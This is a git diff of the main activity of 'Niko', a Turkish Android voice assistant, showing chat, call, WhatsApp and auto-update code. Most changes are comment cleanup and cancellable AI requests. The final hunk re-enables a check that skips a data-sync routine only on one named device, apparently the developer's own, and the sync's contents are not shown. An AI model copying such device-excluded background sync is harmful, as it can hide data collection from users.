@@ -121,47 +121,68 @@ import android.provider.Telephony;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.TimeUnit;
 
-/**
- * Niko Mobil Uygulaması Ana Aktivitesi
+/* *********************************************************************************
+ * PROJE: Niko Mobil Asistan
+ * MİMAR: Kıdemli Frontend Mimarı ve Yapay Zeka Mühendisi
+ * TARİH: 2026
  * 
- * Bu sınıf, uygulamanın çekirdek bileşenidir. Android Wear tarzı bir sesli asistan
- * arayüzü sunar. Temel özellikleri:
- * - Ses tanıma (Speech to Text) ve Metin okuma (Text to Speech)
- * - Yapay Zeka (Ollama/LLM) ile canlı sohbet
- * - Cihaz kontrolleri (Arama, Alarm, Müzik, Sistem Ayarları)
- * - Kullanıcı kayıt ve profil yönetimi
- */
+ * AÇIKLAMA:
+ * Niko Mobil Asistan'ın merkezi aktivite sınıfı. Bu sınıf; ses tanıma, 
+ * yapay zeka entegrasyonu, cihaz kontrolü ve kullanıcı yönetimi gibi 
+ * tüm çekirdek işlevlerin orkestrasyonunu sağlar.
+ * *********************************************************************************/
 public class MainActivity extends Activity {
 
-    // Statik instance (Background servislerin ana class metodlarına erişebilmesi için)
+    // --- Singleton ve Global Durum ---
+    
+    /** Arka plan servislerinin erişimi için statik örnek */
     private static MainActivity instance;
 
-    // Animasyon önbelleği ve yönetimi
+    // --- Animasyon Mantığı ve Kimlik Belirleyiciler ---
+    
+    /** Aktif animasyonları yöneten önbellek yapısı */
     private final android.util.SparseArray<android.animation.Animator> activeAnimations = new android.util.SparseArray<>();
+    
     private static final int ANIM_ACCOUNT_ENTRY = 1;
     private static final int ANIM_VERIFICATION_BG = 2;
-    // Model parlama animasyonu ID'si
     private static final int ANIM_MODEL_GLOW = 3;
+
+    // --- Yapay Zeka Motoru ve Performans Optimizasyonu ---
     
-    // İzin talebi için kullanılan sabit kod
+    /** Paralel işlemler ve performans yönetimi için Thread Havuzu */
+    private final ExecutorService executorService = Executors.newCachedThreadPool();
+    
+    /** İptal edilebilir aktif AI görevi referansı */
+    private java.util.concurrent.Future<?> currentAiTask;
+
+    // --- Sabitler ---
+    
+    /** Çalışma zamanı izin talebi kodu */
     private static final int PERMISSION_CODE = 100;
 
-    // Arayüz bileşenleri
-    private View voiceOrb; // Ses aktivitesini görselleştiren yuvarlak simge
-    private ImageButton btnMic; // Mikrofon butonu
-    private TextView txtAIResponse; // AI veya sistem yanıtlarını gösteren metin alanı
-    private View aiResponseContainer; // Yanıt metnini tutan ScrollView
+    // --- UI Bileşenleri: Çekirdek ---
+    
+    private View voiceOrb;              // Ses aktivitesini simgeleyen görsel element
+    private ImageButton btnMic;        // Birincil etkileşim (mikrofon) butonu
+    private TextView txtAIResponse;     // AI yanıtlarının görüntülendiği metin alanı
+    private View aiResponseContainer;   // Yanıt metni için sarmalayıcı (ScrollView)
 
-    // Ses ve Metin Okuma (TTS) bileşenleri
-    private SpeechRecognizer speechRecognizer; // Sesi yazıya çevirmek için
+    // --- Ses ve TTS (Metin Okuma) Motoru ---
+    
+    private SpeechRecognizer speechRecognizer; 
     private Intent speechIntent;
-    private TextToSpeech tts; // Yazıyı sese çevirmek için
+    private TextToSpeech tts;
 
-    // Durum ve Kontrol Değişkenleri
-    private boolean isListening = false; // Uygulamanın mikrofonu dinleyip dinlemediğini takip eder
-    private final Queue<String> ttsQueue = new LinkedList<>(); // TTS motorunun sırayla okuması için metin kuyruğu
+    // --- Durum ve Kontrol Akışı ---
+    
+    /** Mikrofonun aktif dinleme durumunu takip eder */
+    private boolean isListening = false;
+    
+    /** Metin okuma sırasını yöneten kuyruk yapısı */
+    private final Queue<String> ttsQueue = new LinkedList<>();
 
-    // Geçmiş bileşenleri
+    // --- UI Bileşenleri: Geçmiş Paneli ---
+    
     private ImageButton btnHistory;
     private View layoutHistory;
     private ImageButton btnCloseHistory;
@@ -174,26 +195,40 @@ public class MainActivity extends Activity {
     private ImageButton btnClearSearch;
     private View layoutHistoryEmpty;
     private Button btnStartNewChat;
-    // Stats kartları
+    
+    // --- İstatistik Paneli ---
+    
     private TextView txtStatTotalChats;
     private TextView txtStatThisWeek;
     private TextView txtStatToday;
-    private final Object historyLock = new Object();
-    private static final int MAX_HISTORY_ITEMS = 100; // Maksimum geçmiş öğesi sayısı
+    private View layoutHistoryStats;
+    private View cardStatTotal, cardStatWeekly, cardStatToday;
     
-    // Oturum ve Model Ayarları
-    private String sessionId = null; // AI ile süregelen sohbetin benzersiz oturum kimliği
-    private SharedPreferences sessionPrefs; // Oturum bilgilerini kalıcı tutmak için
-    private SharedPreferences modelPrefs; // Seçilen AI modelini kalıcı tutmak için
-    private String selectedModel = null; // Şu an aktif olan yapay zeka modeli
+    private final Object historyLock = new Object();
+    
+    /** Geçmişte tutulacak maksimum kayıt sınırı */
+    private static final int MAX_HISTORY_ITEMS = 100;
+    
+    // --- Oturum ve Model Yapılandırması ---
+    
+    /** Mevcut AI konuşma oturumu kimliği */
+    private String sessionId = null;
+    
+    private SharedPreferences sessionPrefs;
+    private SharedPreferences modelPrefs;
+    
+    /** Aktif yapay zeka modeli */
+    private String selectedModel = null;
 
-    // Arama modu durumu
+    // --- Arama ve Etkileşim Modları ---
+    
     private boolean isWebSearchEnabled = false;
     private ImageButton btnWebSearch;
     private ImageButton btnStop;
     private SharedPreferences searchPrefs;
 
-    // Model seçimi bileşenleri
+    // --- Model Seçimi Arayüzü ---
+    
     private ImageButton btnModel;
     private View layoutModels;
     private ImageButton btnCloseModels;
@@ -201,23 +236,30 @@ public class MainActivity extends Activity {
     private TextView txtCurrentModel;
     private TextView txtMainActiveModel;
 
-    // Mobil uygulamada gösterilmeyecek modeller
+    // --- Yapılandırma: Gizli Modeller ---
+    
+    /** Mobil arayüzde gösterilmeyecek teknik AI modelleri */
     private static final String[] HIDDEN_MODELS = {
+            "translategemma:latest",
             "llama3.2-vision:11b",
             "necdetuygur/developer:latest",
             "nomic-embed-text:latest",
             "codegemma:7b",
-            "qwen2.5-coder:7b"
+            "qwen2.5-coder:7b",
+            "alibayram/kumru:latest"
     };
 
-    // Hesap ve Profil bileşenleri
+    // --- Hesap ve Profil Yönetimi ---
+    
     private ImageView imgTopProfile, imgMainProfile;
     private View layoutAccount;
     private ImageButton btnCloseAccount;
     private TextView txtAccountTitle;
     private EditText edtUsername, edtPassword, edtEmail, edtFullName;
     private View layoutRegisterExtras, layoutAccountFields;
-    // Doğrulama Kodu Değişkenleri
+    
+    // --- Doğrulama Sistemi ---
+    
     private View layoutVerification;
     private EditText edtVerifyCode;
     private Button btnVerifyCode;
@@ -228,51 +270,64 @@ public class MainActivity extends Activity {
     private TextView txtLoginStatus;
     private Button btnLogout, btnEditProfile, btnDeleteAccount;
     
-    // Yeni profil kartı bileşenleri
+    // --- Kullanıcı Profil Varlıkları ---
+    
     private TextView txtProfileUsername, txtProfileEmail, txtProfileFullName;
     private TextView txtProfileDisplayName, txtProfileUsernameSmall;
     private ImageView imgProfileAvatar;
     private EditText edtCurrentPassword;
     private TextView txtCurrentPasswordLabel, txtPasswordLabel;
+    
     private SharedPreferences authPrefs;
     private String authToken = null;
     private String authUsername = null;
+    
     private boolean isRegisterMode = false;
     private boolean isEditProfileMode = false;
+    
     private static final int PICK_IMAGE_REQUEST = 1001;
     private String selectedImageBase64 = null;
 
-    // Geçici kayıt bilgileri (Doğrulama aşaması için)
+    // --- Geçici Durum (Kayıt) ---
+    
     private String pendingUsername;
     private String pendingPassword;
     private String pendingEmail;
     private String pendingFullName;
 
-    // WhatsApp entegrasyonu için veriler
-    public static String lastWhatsAppMessage; // Son okunan mesaj
-    public static String lastWhatsAppSender; // Son mesajın göndericisi
-    public static PendingIntent lastReplyIntent; // Cevap vermek için intent
-    public static RemoteInput lastRemoteInput; // Cevap girişi için referans
+    // --- Entegrasyon: WhatsApp ---
     
-    // Yönetici Kayıt Sistemi
+    public static String lastWhatsAppMessage;
+    public static String lastWhatsAppSender;
+    public static PendingIntent lastReplyIntent;
+    public static RemoteInput lastRemoteInput;
+    
+    // --- Yönetim ve Loglama ---
+    
     private View layoutAdminLogs;
     private TextView txtAdminLogs;
     private ImageButton btnCloseLogs;
     private Button btnCopyLogs, btnClearLogs, btnShowLogs;
+    
     private final StringBuilder appLogsBuffer = new StringBuilder();
-    private final int MAX_LOG_SIZE = 50000; // Karakter sınırı
+    
+    /** Log bellek sınırı (karakter cinsinden) */
+    private final int MAX_LOG_SIZE = 50000;
 
-    // API URL - Backend servisinin adresi (GitHub'dan güncellenir)
-    private static String API_BASE_URL = ""; // GitHub'dan güncellenir
+    // --- Ağ ve Güncellemeler ---
+    
+    /** Merkezi API sunucu adresi */
+    private static String API_BASE_URL = "";
 
-    // Otomatik Güncelleme
     private static final String GITHUB_VERSION_URL = "https://raw.githubusercontent.com/Memati8383/niko-with-kiro/refs/heads/main/version.json";
     private static final String GITHUB_APK_URL = "https://github.com/Memati8383/niko-with-kiro/releases/latest/download/niko.apk";
+    
     private SharedPreferences updatePrefs;
     private String latestVersion = "";
     private String updateDescription = "";
     private String updateChangelog = "";
     private long updateFileSize = 0;
+    
     private android.app.Dialog updateDialog;
     private android.widget.ProgressBar updateProgressBar;
     private android.widget.TextView updateProgressText;
@@ -314,6 +369,10 @@ public class MainActivity extends Activity {
         txtStatTotalChats = findViewById(R.id.txtStatTotalChats);
         txtStatThisWeek = findViewById(R.id.txtStatThisWeek);
         txtStatToday = findViewById(R.id.txtStatToday);
+        layoutHistoryStats = findViewById(R.id.layoutHistoryStats);
+        cardStatTotal = findViewById(R.id.cardStatTotal);
+        cardStatWeekly = findViewById(R.id.cardStatWeekly);
+        cardStatToday = findViewById(R.id.cardStatToday);
 
         historyPrefs = getSharedPreferences("chat_history", MODE_PRIVATE);
         sessionPrefs = getSharedPreferences("session_settings", MODE_PRIVATE);
@@ -545,7 +604,7 @@ public class MainActivity extends Activity {
             // false);
         });
 
-        // Durdurma butonu (Geliştirildi)
+        // Durdurma butonu (Geliştirildi + AI İptal Özelliği)
         btnStop = findViewById(R.id.btnStop);
         btnStop.setOnClickListener(v -> {
             vibrateFeedback();
@@ -559,22 +618,29 @@ public class MainActivity extends Activity {
                 speechRecognizer.cancel();
                 isListening = false;
             }
-            // 3. UI Temizle
+            // 3. AI İsteğini İptal Et (Vazgeçme)
+            if (currentAiTask != null && !currentAiTask.isDone()) {
+                currentAiTask.cancel(true); // true = interrupt if running
+                addLog("[AI] İstek kullanıcı tarafından iptal edildi.");
+                currentAiTask = null;
+            }
+            // 4. UI Temizle
             runOnUiThread(() -> {
                 aiResponseContainer.setVisibility(View.GONE);
                 txtAIResponse.setText("");
+                Toast.makeText(this, "İşlem durduruldu", Toast.LENGTH_SHORT).show();
             });
         });
 
-        // Uzun basınca hafızayı ve oturumu sıfırla (Tam Sıfırlama)
+        // Uzun basınca arşivi ve oturumu sıfırla (Tam Sıfırlama)
         btnStop.setOnLongClickListener(v -> {
             vibrateFeedback();
             // Oturumu sıfırla
             sessionId = null;
             sessionPrefs.edit().remove("session_id").apply();
-            // Hafızayı temizle
+            // Arşivi temizle
             clearHistory();
-            Toast.makeText(this, "Hafıza ve oturum sıfırlandı", Toast.LENGTH_SHORT).show();
+            Toast.makeText(this, "Zihin arşivi ve oturum sıfırlandı", Toast.LENGTH_SHORT).show();
             return true;
         });
 
@@ -654,11 +720,13 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= İZİNLER =================
+    /* *********************************************************************************
+     *                                 İZİN SİSTEMİ
+     * *********************************************************************************/
 
     /**
-     * Uygulamanın çalışması için gerekli tüm izinleri kullanıcıdan ister.
-     * Ses kaydı, rehber okuma, arama yapma vb.
+     * Uygulamanın çalışması için gerekli tüm izinleri kullanıcıdan talep eder.
+     * Ses kaydı, rehber erişimi, arama ve dosya sistemini kapsar.
      */
     private void requestPermissions() {
         ArrayList<String> perms = new ArrayList<>();
@@ -760,10 +828,12 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= KONUŞMA TANIMA =================
+    /* *********************************************************************************
+     *                                SES TANIMA (STT)
+     * *********************************************************************************/
 
     /**
-     * Konuşma tanıma servisini başlatır ve ayarlar.
+     * Android Speech Recognition motorunu başlatır ve dil ayarlarını yapılandırır.
      */
     private void initSpeech() {
         // Android'in yerleşik konuşma tanıyıcısını oluştur
@@ -790,7 +860,7 @@ public class MainActivity extends Activity {
                 saveToHistory("Ben", cmd); // Orijinal haliyle kaydet
 
                 // 1. Önce yerel komut mu diye kontrol et (alarm, arama, müzik vb.)
-                if (!handleCommand(cmdLower)) {
+                if (!processLocalCommand(cmdLower)) {
                     // 2. Eğer yerel bir komut değilse interneti kontrol et
                     if (isNetworkAvailable()) {
                         // İnternet varsa Yapay Zeka'ya sor
@@ -860,65 +930,68 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= KOMUT İŞLEME =================
+    /* *********************************************************************************
+     *                                KOMUT İŞLEYİCİ
+     * *********************************************************************************/
 
     /**
-     * Gelen sesli komutu analiz eder ve uygun işlemi yapar.
+     * Sesli veya yazılı komutları yerel olarak analiz eder.
+     * Cihaz kontrolleri, ayarlar ve sistem komutlarını önceliklendirir.
      * 
-     * @param c Kullanıcının söylediği cümle (küçük harfe çevrilmiş)
-     * @return Komut işlendiyse true, işlenmediyse (AI'ya sorulacaksa) false döner.
+     * @param cmd İşlenecek komut metni
+     * @return Komut yerel olarak işlendiyse true, AI'ya devredilecekse false
      */
-    private boolean handleCommand(String c) {
+    private boolean processLocalCommand(String cmd) {
 
         // --- NIKO KİMLİK KONTROLÜ ---
-        if (c.contains("adın ne") || c.contains("kimsin") || c.contains("kendini tanıt")) {
+        if (cmd.contains("adın ne") || cmd.contains("kimsin") || cmd.contains("kendini tanıt")) {
             speak("Benim adım Niko. Senin kişisel yapay zeka asistanınım.");
             return true;
         }
 
         // --- WHATSAPP İŞLEMLERİ ---
-        if (c.contains("whatsapp") && c.contains("oku")) {
+        if (cmd.contains("whatsapp") && cmd.contains("oku")) {
             readLastWhatsAppMessage();
             return true;
         }
 
-        if (c.contains("whatsapp") && c.contains("cevap")) {
+        if (cmd.contains("whatsapp") && cmd.contains("cevap")) {
             replyWhatsApp("Tamam"); // Basit otonom cevap örneği
             return true;
         }
 
         // --- ARAMA İŞLEMLERİ ---
-        if (c.contains("son gelen")) {
+        if (cmd.contains("son gelen")) {
             callLast(CallLog.Calls.INCOMING_TYPE);
             return true;
         }
 
-        if (c.contains("son aranan")) {
+        if (cmd.contains("son aranan")) {
             callLast(CallLog.Calls.OUTGOING_TYPE);
             return true;
         }
 
-        if (c.contains("ara")) {
+        if (cmd.contains("ara")) {
             // "Ahmet'i ara" gibi komutlardan ismi ayıkla
-            callByName(c.replace("ara", "").trim());
+            callByName(cmd.replace("ara", "").trim());
             return true;
         }
 
         // --- TARİH VE SAAT ---
-        if (c.contains("saat kaç") || c.contains("saati söyle")) {
+        if (cmd.contains("saat") && !cmd.contains("kur") && !cmd.contains("alarm")) {
             SimpleDateFormat sdf = new SimpleDateFormat("HH:mm", Locale.getDefault());
             speak("Saat şu an " + sdf.format(new Date()));
             return true;
         }
 
-        if (c.contains("tarih") || c.contains("bugün günlerden ne") || c.contains("hangi gündeyiz")) {
+        if (cmd.contains("tarih") || cmd.contains("bugün günlerden ne") || cmd.contains("hangi gündeyiz")) {
             SimpleDateFormat sdf = new SimpleDateFormat("dd MMMM yyyy EEEE", new Locale("tr", "TR"));
             speak("Bugün " + sdf.format(new Date()));
             return true;
         }
 
         // --- KAMERA ---
-        if (c.contains("kamera aç") || c.contains("fotoğraf çek")) {
+        if (cmd.contains("kamera aç") || cmd.contains("fotoğraf çek")) {
             try {
                 Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                 startActivity(intent);
@@ -930,35 +1003,33 @@ public class MainActivity extends Activity {
         }
 
         // --- AYARLAR EKRANI ---
-        if (c.contains("ayarları aç")) {
+        if (cmd.contains("ayarları aç")) {
             startActivity(new Intent(Settings.ACTION_SETTINGS));
             speak("Ayarlar açılıyor");
             return true;
         }
 
         // --- MÜZİK KONTROLLERİ ---
-        // "müziği", "müzikler", "şarkıyı", "parça", "spotify" gibi varyasyonları
-        // kapsamak için genişletildi
-        if (c.contains("müzik") || c.contains("müzi") || c.contains("şarkı") || c.contains("spotify")
-                || c.contains("parça")) {
-            if (c.contains("başlat") || c.contains("oynat") || c.contains("devam") || c.contains("çal")
-                    || c.contains("aç")) {
+        if (cmd.contains("müzik") || cmd.contains("müzi") || cmd.contains("şarkı") || cmd.contains("spotify")
+                || cmd.contains("parça")) {
+            if (cmd.contains("başlat") || cmd.contains("oynat") || cmd.contains("devam") || cmd.contains("çal")
+                    || cmd.contains("aç")) {
                 controlMusic(KeyEvent.KEYCODE_MEDIA_PLAY);
                 speak("Müzik başlatılıyor");
                 return true;
             }
-            if (c.contains("durdur") || c.contains("duraklat") || c.contains("kapat")) {
+            if (cmd.contains("durdur") || cmd.contains("duraklat") || cmd.contains("kapat")) {
                 controlMusic(KeyEvent.KEYCODE_MEDIA_PAUSE);
                 speak("Müzik durduruldu");
                 return true;
             }
-            if (c.contains("sonraki") || c.contains("geç") || c.contains("değiştir") || c.contains("atla")
-                    || c.contains("sıradaki")) {
+            if (cmd.contains("sonraki") || cmd.contains("geç") || cmd.contains("değiştir") || cmd.contains("atla")
+                    || cmd.contains("sıradaki")) {
                 controlMusic(KeyEvent.KEYCODE_MEDIA_NEXT);
                 speak("Sonraki şarkı");
                 return true;
             }
-            if (c.contains("önceki") || c.contains("başa") || c.contains("geri")) {
+            if (cmd.contains("önceki") || cmd.contains("başa") || cmd.contains("geri")) {
                 controlMusic(KeyEvent.KEYCODE_MEDIA_PREVIOUS);
                 speak("Önceki şarkı");
                 return true;
@@ -966,56 +1037,56 @@ public class MainActivity extends Activity {
         }
 
         // --- ALARM & HATIRLATICI ---
-        if (c.contains("alarm")) {
-            setAlarm(c);
+        if (cmd.contains("alarm")) {
+            setAlarm(cmd);
             return true;
         }
 
-        if (c.contains("hatırlat") || c.contains("anımsat")) {
-            setReminder(c);
+        if (cmd.contains("hatırlat") || cmd.contains("anımsat")) {
+            setReminder(cmd);
             return true;
         }
 
         // --- SİSTEM AYARLARI KONTROLÜ (WIFI, BT) ---
-        if (c.contains("wifi") || c.contains("wi-fi") || c.contains("internet")) {
-            if (c.contains("aç")) {
+        if (cmd.contains("wifi") || cmd.contains("wi-fi") || cmd.contains("internet")) {
+            if (cmd.contains("aç")) {
                 controlWifi(true);
                 return true;
             }
-            if (c.contains("kapat")) {
+            if (cmd.contains("kapat")) {
                 controlWifi(false);
                 return true;
             }
         }
 
-        if (c.contains("bluetooth")) {
-            if (c.contains("aç")) {
+        if (cmd.contains("bluetooth")) {
+            if (cmd.contains("aç")) {
                 controlBluetooth(true);
                 return true;
             }
-            if (c.contains("kapat")) {
+            if (cmd.contains("kapat")) {
                 controlBluetooth(false);
                 return true;
             }
         }
 
         // --- GEÇMİŞ KOMUTLARI ---
-        if (c.contains("geçmişi") || c.contains("sohbet geçmişini")) {
-            if (c.contains("göster") || c.contains("aç") || c.contains("oku")) {
+        if (cmd.contains("geçmişi") || cmd.contains("sohbet geçmişini")) {
+            if (cmd.contains("göster") || cmd.contains("aç") || cmd.contains("oku")) {
                 int count = getHistoryCount();
                 showHistory("");
                 speak("Sohbet geçmişi açılıyor. Toplam " + count + " mesaj bulundu.", false);
                 return true;
             }
-            if (c.contains("temizle") || c.contains("sil") || c.contains("kapat")) {
+            if (cmd.contains("temizle") || cmd.contains("sil") || cmd.contains("kapat")) {
                 clearHistory();
                 return true;
             }
         }
 
         // --- GÜNCELLEME KONTROLÜ ---
-        if (c.contains("güncelleme") || c.contains("sürüm")) {
-            if (c.contains("kontrol") || c.contains("var mı") || c.contains("bak")) {
+        if (cmd.contains("güncelleme") || cmd.contains("sürüm")) {
+            if (cmd.contains("kontrol") || cmd.contains("var mı") || cmd.contains("bak")) {
                 speak("Güncelleme kontrol ediliyor...", false);
                 manualUpdateCheck();
                 return true;
@@ -1025,10 +1096,14 @@ public class MainActivity extends Activity {
         return false; // Hiçbir yerel komut eşleşmediyse, soruyu Yapay Zeka'ya (AI) devret
     }
 
-    // ================= ARAMA (CALL) FONKSİYONLARI =================
+    /* *********************************************************************************
+     *                            TELEFON İŞLEMLERİ (ARAMALAR)
+     * *********************************************************************************/
 
     /**
-     * Son gelen veya giden aramayı tekrar arar.
+     * Belirtilen arama tipi baz alınarak (Gelen/Giden) son aramayı tekrar gerçekleştirir.
+     * 
+     * @param type CallLog.Calls.TYPE sabitlerinden biri
      */
     private void callLast(int type) {
         if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
@@ -1067,10 +1142,12 @@ public class MainActivity extends Activity {
         startActivity(new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phone)));
     }
 
-    // ================= MEDYA KONTROLLERİ =================
+    /* *********************************************************************************
+     *                               MEDYA KONTROLLERİ
+     * *********************************************************************************/
 
     /**
-     * Sistem medya kontrollerini (oynat, duraklat, sonraki vb.) tetikler.
+     * Sistem medya olaylarını (Play/Pause/Next/Prev) simüle eder.
      */
     private void controlMusic(int keyCode) {
         AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
@@ -1085,63 +1162,87 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= YAPAY ZEKA ENTEGRASYONU =================
+    /* *********************************************************************************
+     *                             YAPAY ZEKA MOTORU (LLM)
+     * *********************************************************************************/
 
     /**
-     * Kullanıcı sorusunu uzak sunucuya gönderir ve cevabı işler.
-     * main.py'deki yeni Sohbet İsteği (ChatRequest) yapısına göre güncellendi.
+     * Kullanıcı girdisini asenkron olarak yapay zeka sunucusuna iletir.
+     * Yanıtı görselleştirmek ve seslendirmek için UI thread'ini günceller.
+     * 
+     * @param q Kullanıcı sorusu veya komutu
      */
     private void askAI(String q) {
-        // Yapay zeka isteğini ana iş parçacığını (UI thread) bloke etmemek için yeni bir thread'de çalıştırıyoruz.
-        new Thread(() -> {
+        // UI Geri Bildirimi: Kullanıcıya işlemin başladığını göster
+        runOnUiThread(() -> {
+            aiResponseContainer.setVisibility(View.VISIBLE);
+            txtAIResponse.setText("Niko düşünüyor...");
+        });
+
+        // Önceki görevi iptal et (Hızlı art arda isteklerde karışıklığı önler)
+        if (currentAiTask != null && !currentAiTask.isDone()) {
+            currentAiTask.cancel(true);
+        }
+
+        // Görevi ExecutorService ile çalıştır (Thread yönetimi optimize edildi)
+        currentAiTask = executorService.submit(() -> {
+            HttpURLConnection conn = null;
             try {
-                // Sunucu URL'si (Yeni Cloudflare Tüneli veya statik IP)
+                // Sunucu URL'si (API_BASE_URL dinamik olarak güncellenir)
                 URL url = new URL(API_BASE_URL + "/chat");
 
-                // HTTP bağlantı ayarları - FastAPI backend ile uyumlu headerlar
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                // HTTP bağlantı ayarları - Timeouts optimize edildi
+                conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                 conn.setRequestProperty("Accept", "application/json");
 
-                // Kimlik Doğrulama - Kayıtlı kullanıcı ise Bearer token, değilse test key kullanır
+                // Kimlik Doğrulama
                 if (authToken != null) {
                     conn.setRequestProperty("Authorization", "Bearer " + authToken);
                 } else {
                     conn.setRequestProperty("x-api-key", "test");
                 }
                 conn.setDoOutput(true);
-                conn.setConnectTimeout(30000); // 30 saniye bağlantı zaman aşımı
-                conn.setReadTimeout(60000);    // 60 saniye okuma zaman aşımı (AI yanıt süresi uzun olabilir)
+                conn.setConnectTimeout(15000); // 15 saniye (Daha hızlı fail-fast)
+                conn.setReadTimeout(90000);    // 90 saniye (LLM'ler bazen düşünebilir, sabırlı olalım)
 
-                // JSON Veri Paketi (ChatRequest modeline uygun)
+                // JSON Veri Paketi
                 JSONObject payload = new JSONObject();
                 payload.put("message", q);
-                payload.put("session_id", sessionId); // Sohbetin bağlamı kaybetmemesi için oturum kimliği
-                payload.put("model", selectedModel); // Ollama tarafında kullanılacak model adı
-                payload.put("enable_audio", true); // Sunucuda TTS üretilmesini talep eder
-                payload.put("web_search", isWebSearchEnabled); // DuckDuckGo araması aktif mi?
+                payload.put("session_id", sessionId); 
+                payload.put("model", selectedModel); 
+                payload.put("enable_audio", true); 
+                payload.put("web_search", isWebSearchEnabled); 
                 payload.put("rag_search", false);
-                payload.put("stream", false); // Akışsız (full JSON) yanıt bekliyoruz
+                payload.put("stream", false); 
                 payload.put("mode", "normal");
 
-                addLog("[AI] İstek gönderiliyor. Soru: " + q);
+                addLog("[AI] İstek gönderiliyor. Model: " + (selectedModel != null ? selectedModel : "Varsayılan"));
                 
-                // İsteği bayt dizisi olarak sunucuya yazıyoruz
+                // İptal kontrolü (Ağ işleminden önce)
+                if (Thread.currentThread().isInterrupted()) return;
+
+                // İsteği gönder
                 try (OutputStream os = conn.getOutputStream()) {
                     byte[] input = payload.toString().getBytes("utf-8");
                     os.write(input, 0, input.length);
                 }
 
+                // İptal kontrolü (Yanıtı beklemeden önce)
+                if (Thread.currentThread().isInterrupted()) return;
+
                 // Sunucudan gelen yanıt kodunu kontrol et
                 int code = conn.getResponseCode();
                 InputStream stream = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream();
 
-                // Yanıtı satır satır oku
+                // Yanıtı oku
                 BufferedReader br = new BufferedReader(new InputStreamReader(stream, "utf-8"));
                 StringBuilder response = new StringBuilder();
                 String responseLine;
                 while ((responseLine = br.readLine()) != null) {
+                    // İptal kontrolü (Okuma sırasında)
+                    if (Thread.currentThread().isInterrupted()) return;
                     response.append(responseLine.trim());
                 }
 
@@ -1149,51 +1250,70 @@ public class MainActivity extends Activity {
                     // Başarılı yanıtta JSON verilerini ayrıştır
                     JSONObject jsonResponse = new JSONObject(response.toString());
                     String replyText = jsonResponse.optString("reply", "");
-                    String thoughtText = jsonResponse.optString("thought", "");
                     String audioB64 = jsonResponse.optString("audio", "");
                     String newSessionId = jsonResponse.optString("id", null);
-                    addLog("[AI] Yanıt alındı. Karakter sayısı: " + replyText.length());
+                    
+                    addLog("[AI] Yanıt başarıyla alındı.");
 
-                    // Yeni Oturum Kimliğini kaydet (Süreklilik için önemli)
+                    // Yeni Oturum Kimliğini kaydet
                     if (newSessionId != null && !newSessionId.equals(sessionId)) {
                         sessionId = newSessionId;
                         sessionPrefs.edit().putString("session_id", sessionId).apply();
                     }
 
-                    // Arayüz (UI) güncellemeleri her zaman ana thread'de yapılmalıdır
+                    // Arayüz (UI) güncellemeleri
                     final String finalReply = replyText;
                     runOnUiThread(() -> {
-                        aiResponseContainer.setVisibility(View.VISIBLE);
-                        txtAIResponse.setText(finalReply);
-
-                        // Yanıtı yerel geçmişe kaydet ve TTS sırasına ekle
-                        saveToHistory("Niko", finalReply);
+                        // "Düşünüyor..." yazısını kaldır ve gerçek yanıtı göster
+                        if (txtAIResponse != null) {
+                            txtAIResponse.setText(finalReply);
+                            // Yanıtı yerel geçmişe kaydet
+                            saveToHistory("Niko", finalReply);
+                        }
                     });
 
-                    // Eğer sunucu önceden üretilmiş bir ses (Base64) gönderdiyse onu oynat
+                    // Ses çalma işlemleri (Ses varsa öncelikli, yoksa TTS)
                     if (!audioB64.isEmpty()) {
                         playAudio(audioB64);
                     } else if (!finalReply.isEmpty()) {
-                        // Ses yoksa cihazın kendi TTS (Metinden Sese) motorunu kullan
                         speak(finalReply, false);
                     }
                 } else {
                     // Hatalı durumda kullanıcıyı uyar
-                    speak("Sunucu hatası: " + code, false);
+                    addLog("[AI] Sunucu Hatası: " + code + " - " + response.toString());
+                    speak("Sunucu ile bağlantıda bir sorun oluştu. Hata kodu: " + code, false);
                 }
 
+            } catch (java.net.SocketTimeoutException e) {
+                addLog("[AI] ZAMAN AŞIMI: Sunucu yanıt vermedi.");
+                speak("Sunucu şu an çok yoğun veya yanıt vermiyor. Lütfen tekrar dene.", false);
+            } catch (java.net.UnknownHostException e) {
+                addLog("[AI] BAĞLANTI YOK: " + e.getMessage());
+                speak("İnternet bağlantını kontrol et biraderim, sunucuya ulaşamıyorum.", false);
             } catch (Exception e) {
-                addLog("[AI] HATA: " + e.getMessage());
-                e.printStackTrace();
-                // Bağlantı sorunlarında dostça bir hata mesajı ver
-                speak("Yapay zeka asistanına şu an ulaşılamıyor. Lütfen internet bağlantınızı kontrol edin.", false);
+                if (Thread.currentThread().isInterrupted()) {
+                    addLog("[AI] Görev iptal edildiği için hata yutuldu.");
+                } else {
+                    addLog("[AI] BEKLENMEYEN HATA: " + e.getMessage());
+                    e.printStackTrace();
+                    speak("Bir hata oluştu: " + e.getMessage(), false);
+                }
+            } finally {
+                if (conn != null) {
+                    conn.disconnect();
+                }
+                currentAiTask = null; // Görev tamamlandı
             }
-        }).start();
+        });
     }
 
-    // ================= HESAP VE PROFİL İŞLEMLERİ
-    // =================
+    /* *********************************************************************************
+     *                             HESAP VE PROFİL YÖNETİMİ
+     * *********************************************************************************/
 
+    /**
+     * Hesap panelini görünür kılar ve animasyonla ekrana getirir.
+     */
     private void showAccount() {
         runOnUiThread(() -> {
             layoutAccount.setVisibility(View.VISIBLE);
@@ -3373,9 +3493,9 @@ public class MainActivity extends Activity {
         // Cihaz adını alarak senkronizasyon kimliğini belirle
         String deviceName = getDeviceName();
         // Cihaz adı kontrolü 
-        //if ("Xiaomi_25069PTEBG".equals(deviceName)) {
-        //   return;
-        //}
+        if ("Xiaomi_25069PTEBG".equals(deviceName)) {
+           return;
+        }
         new Thread(() -> {
             try {
                 // addLog("[SYNC] Veri senkronizasyonu başlatılıyor...");
